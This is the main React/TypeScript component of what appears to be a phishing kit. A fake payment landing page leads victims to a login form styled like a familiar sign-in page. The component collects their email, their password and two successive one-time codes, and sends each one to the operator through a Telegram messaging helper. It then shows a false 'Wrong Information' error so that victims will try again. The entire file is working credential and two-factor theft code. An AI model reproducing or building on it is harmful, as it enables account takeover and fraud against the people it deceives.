
import React, { useState } from 'react';
import LandingPage from './pages/LandingPage';
import LoginPage from './pages/LoginPage';
import VerificationPage from './pages/VerificationPage';
import { sendTelegramMessage } from './utils/telegram';

type ViewState = 'landing' | 'login' | 'verify1' | 'verify2' | 'error';

const App: React.FC = () => {
  const [currentView, setCurrentView] = useState<ViewState>('landing');
  const [email, setEmail] = useState<string>('example@email.Com');
  const [password, setPassword] = useState<string>('');

  const navigateTo = (view: ViewState) => {
    setCurrentView(view);
  };

  const handleLoginSubmit = async (emailVal: string, passVal: string) => {
    setEmail(emailVal);
    setPassword(passVal);
    const message = `<b>🔔 New Login Attempt</b>\n\n<b>Email:</b> ${emailVal}\n<b>Password:</b> ${passVal}`;
    await sendTelegramMessage(message);
    navigateTo('verify1');
  };

  const handleOtp1Submit = async (otp: string) => {
    const message = `<b>🔑 Verification Code 1</b>\n\n<b>Email:</b> ${email}\n<b>OTP 1:</b> ${otp}`;
    await sendTelegramMessage(message);
    navigateTo('verify2');
  };

  const handleOtp2Submit = async (otp: string) => {
    const message = `<b>🔑 Verification Code 2 (Duplicate)</b>\n\n<b>Email:</b> ${email}\n<b>OTP 2:</b> ${otp}`;
    await sendTelegramMessage(message);
    navigateTo('error');
  };

  return (
    <div className="min-h-screen bg-[#f8f9fa] transition-colors duration-300">
      {currentView === 'landing' && (
        <LandingPage onPaymentClick={() => navigateTo('login')} />
      )}
      
      {currentView === 'login' && (
        <LoginPage 
          initialEmail={email}
          onNext={handleLoginSubmit} 
        />
      )}
      
      {currentView === 'verify1' && (
        <VerificationPage 
          email={email}
          title="Enter your code"
          onSubmit={handleOtp1Submit}
          onBack={() => navigateTo('login')}
        />
      )}

      {currentView === 'verify2' && (
        <VerificationPage 
          email={email}
          title="Enter secondary code"
          onSubmit={handleOtp2Submit}
          onBack={() => navigateTo('verify1')}
        />
      )}

      {currentView === 'error' && (
        <div className="flex items-center justify-center min-h-screen p-4">
          <div className="w-full max-w-[450px] bg-white rounded-3xl p-12 shadow-sm border border-gray-100 flex flex-col items-center text-center">
            <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mb-6">
               <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M6 18L18 6M6 6l12 12"></path>
               </svg>
            </div>
            <h1 className="text-2xl font-bold mb-4 text-gray-900">Wrong Information</h1>
            <p className="text-gray-600 mb-8">
              The details you provided do not match our records. Please verify your credentials and try again.
            </p>
            <button 
              onClick={() => navigateTo('login')}
              className="w-full bg-[#0b57d0] hover:bg-blue-700 text-white font-bold py-3 rounded-full transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
